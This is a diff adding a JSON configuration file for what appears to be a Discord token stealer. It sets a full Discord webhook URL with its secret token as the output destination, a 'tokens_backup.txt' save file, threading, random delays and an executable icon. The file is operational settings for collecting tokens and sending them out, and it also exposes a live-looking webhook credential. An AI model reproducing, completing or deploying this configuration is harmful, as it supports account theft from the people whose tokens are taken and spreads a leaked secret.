@@ -1,0 +1,19 @@
+{
+    "webhook_urls": [
+        "https://discord.com/api/webhooks/1469746663378911404/plDDuU8w_PcbqP37J-eZKyJbHpAuoqAOX9td3FHxdsZXLCj3Q7FB5gB4imYPxBG__oj9"
+    ],
+    "avatar_url": "https://imgur.com/HmoE29J",
+    "embed_color": 1752220,
+    "timeout": 10,
+    "silent_mode": false,
+    "dry_run": false,
+    "save_to_file": true,
+    "backup_file": "tokens_backup.txt",
+    "max_threads": 20,
+    "random_delays": true,
+    "min_delay": 0.01,
+    "max_delay": 0.05,
+    "webhook_retry_count": 3,
+    "webhook_retry_delay": 2.0,
+    "exe_icon": "https://imgur.com/HmoE29J"
+}
